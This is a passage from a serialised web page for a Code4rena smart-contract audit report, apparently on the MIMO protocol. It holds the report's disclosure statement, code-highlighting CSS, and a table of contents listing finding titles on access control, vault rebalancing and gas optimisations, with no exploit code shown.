0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-4\">High Risk Findings (4)</a></p>\n<ul>\n<li><a href=\"#h-01-mimoemptyvaultsol-executeoperation-does-not-transfer-the-vault-leftover-assets-to-the-owner-it-is-locked-in-the-mimoemptyvault\">[H-01] <code>MIMOEmptyVault.sol executeOperation()</code> does not transfer the Vault leftover assets to the owner, it is locked in the <code>MIMOEmptyVault</code></a></li>\n<li><a href=\"#h-02-automation--management-can-be-set-for-not-yet-existing-vault\">[H-02] Automation / management can be set for not yet existing vault</a></li>\n<li><a href=\"#h-03-registrysol-fails-to-deliver-expected-functionality\">[H-03] Registry.sol fails to deliver expected functionality</a></li>\n<li><a href=\"#h-04-incorrect-implementation-of-access-control-in-mimoproxyexecute\">[H-04] Incorrect implementation of access control in MIMOProxy:execute</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-8\">Medium Risk Findings (8)</a></p>\n<ul>\n<li><a href=\"#m-01-vault-rebalancing-can-be-exploited-if-two-vaults-rebalance-into-the-same-vault\">[M-01] Vault rebalancing can be exploited if two vaults rebalance into the same vault</a></li>\n<li><a href=\"#m-02-malicious-targets-can-manipulate-mimoproxy-permissions\">[M-02] Malicious targets can manipulate MIMOProxy permissions</a></li>\n<li><a href=\"#m-03-malicious-manipulation-of-gas-reserve-can-deny-access-to-mimoproxy\">[M-03] Malicious manipulation of gas reserve can deny access to MIMOProxy</a></li>\n<li><a href=\"#m-04-persisted-msgvalue-in-a-loop-of-delegate-calls-can-be-used-to-drain-eth-from-your-proxy\">[M-04] Persisted msg.value in a loop of delegate calls can be used to drain ETH from your proxy</a></li>\n<li><a href=\"#m-05-mimomanagedrebalancesolrebalance-calculates-managerfee-incorrectly\">[M-05] MIMOManagedRebalance.sol#rebalance calculates managerFee incorrectly</a></li>\n<li><a href=\"#m-06-proxyfactory-can-circumvent-proxyregistry\">[M-06] ProxyFactory can circumvent ProxyRegistry</a></li>\n<li><a href=\"#m-07-vaultowner-can-front-run-rebalance-with-setautomation-to-lower-incentives-\">[M-07] <code>vaultOwner</code> Can Front-Run <code>rebalance()</code> With <code>setAutomation()</code> To Lower Incentives </a></li>\n<li><a href=\"#m-08-if-a-mimoproxy-owner-destroys-their-proxy-they-cannot-deploy-another-from-the-same-address\">[M-08] If a MIMOProxy owner destroys their proxy, they cannot deploy another from the same address</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#low-risk-issues\">Low Risk Issues</a></li>\n<li><a href=\"#l01--use-of-msgvalue-in-functions-available-to-batches\">L‑01  Use of <code>msg.value</code> in functions available to batches</a></li>\n<li><a href=\"#l02--unusedempty-receivefallback-function\">L‑02  Unused/empty <code>receive()</code>/<code>fallback()</code> function</a></li>\n<li><a href=\"#l03--missing-checks-for-address0x0-when-assigning-values-to-address-state-variables\">L‑03  Missing checks for <code>address(0x0)</code> when assigning values to <code>address</code> state variables</a></li>\n<li><a href=\"#non-critical-issues\">Non-Critical Issues</a></li>\n<li><a href=\"#n01--missing-initializer-modifier-on-constructor\">N‑01  Missing <code>initializer</code> modifier on constructor</a></li>\n<li><a href=\"#n02--override-function-arguments-that-are-unused-should-have-the-variable-name-removed-or-commented-out-to-avoid-compiler-warnings\">N‑02  <code>override</code> function arguments that are unused should have the variable name removed or commented out to avoid compiler warnings</a></li>\n<li><a href=\"#n03--constants-should-be-defined-rather-than-using-magic-numbers\">N‑03  <code>constant</code>s should be defined rather than using magic numbers</a></li>\n<li><a href=\"#n04--use-a-more-recent-version-of-solidity\">N‑04  Use a more recent version of solidity</a></li>\n<li><a href=\"#n05--constant-redefined-elsewhere\">N‑05  Constant redefined elsewhere</a></li>\n<li><a href=\"#n06--lines-are-too-long\">N‑06  Lines are too long</a></li>\n<li><a href=\"#n07--typos\">N‑07  Typos</a></li>\n<li><a href=\"#n08--file-is-missing-natspec\">N‑08  File is missing NatSpec</a></li>\n<li><a href=\"#n09--natspec-is-incomplete\">N‑09  NatSpec is incomplete</a></li>\n<li><a href=\"#n10--event-is-missing-indexed-fields\">N‑10  Event is missing <code>indexed</code> fields</a></li>\n<li><a href=\"#n11--not-using-the-named-return-variables-anywhere-in-the-function-is-confusing\">N‑11  Not using the named return variables anywhere in the function is confusing</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#table-of-contents\">Table of Contents</a></li>\n<li><a href=\"#g-01-caching-storage-values-in-memory\">G-01 Caching storage values in memory</a></li>\n<li><a href=\"#g-02-multiple-accesses-of-a-mappingarray-should-use-a-local-variable-cache\">G-02 Multiple accesses of a mapping/array should use a local variable cache</a></li>\n<li><a href=\"#g-03-use-of-the-memory-keyword-when-storage-should-be-used\">G-03 Use of the <code>memory</code> keyword when <code>storage</code> should be used</a></li>\n<li><a href=\"#g-04-unnecessary-memory-operations-with-an-immutable-variable\">G-04 Unnecessary memory operations with an <code>immutable</code> variable</a></li>\n<li><a href=\"#g-05-the-result-of-a-function-call-should-be-cached-rather-than-re-calling-the-function\">G-05 The result of a function call should be cached rather than re-calling the function</a></li>\n<li><a href=\"#g-06-unchecking-arithmetics-operations-that-cant-underflowoverflow\">G-06 Unchecking arithmetics operations that can’t underflow/overflow</a></li>\n<li><a href=\"#g-07-arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop\">G-07 <code>&#x3C;array>.length</code> should not be looked up in every loop of a <code>for-loop</code></a></li>\n<li><a href=\"#g-08-i-costs-less-gas-compared-to-i-or-i--1-same-for---i-vs-i---or-i---1\">G-08 <code>++i</code> costs less gas compared to <code>i++</code> or <code>i += 1</code> (same for <code>--i</code> vs <code>i--</code> or <code>i -= 1</code>)</a></li>\n<li><a href=\"#g-09-incrementsdecrements-can-be-unchecked-in-for-loops\">G-09 Increments/decrements can be unchecked in for-loops</a></li>\n<li><a href=\"#g-10-it-costs-more-gas-to-initialize-variables-with-their-default-value-than-letting-the-default-value-be-applied\">G-10 It costs more gas to initialize variables with their default value than letting the default value be applied.</a></li>\n<li><a href=\"#g-11-upgrade-pragma\">G-11 Upgrade pragma</a></li>\n<li><a href=\"#g-12-optimizations-with-assembly\">G-12 Optimizations with assembly</a></li>\n<li><a href=\"#g-13-use-custom-errors-instead-of-revert-strings-to-save-gas\">G-13 Use Custom Errors instead of Revert Strings to save Gas</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#mitigation-review\">Mitigation Review</a></p>\n<ul>\n<li><a href=\"#intro\">Intro</a></li>\n<li><a href=\"#mitigation-overview\">Mitigation Overview</a></li>\n<li><a href=\"#findings\">Findings</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>"
}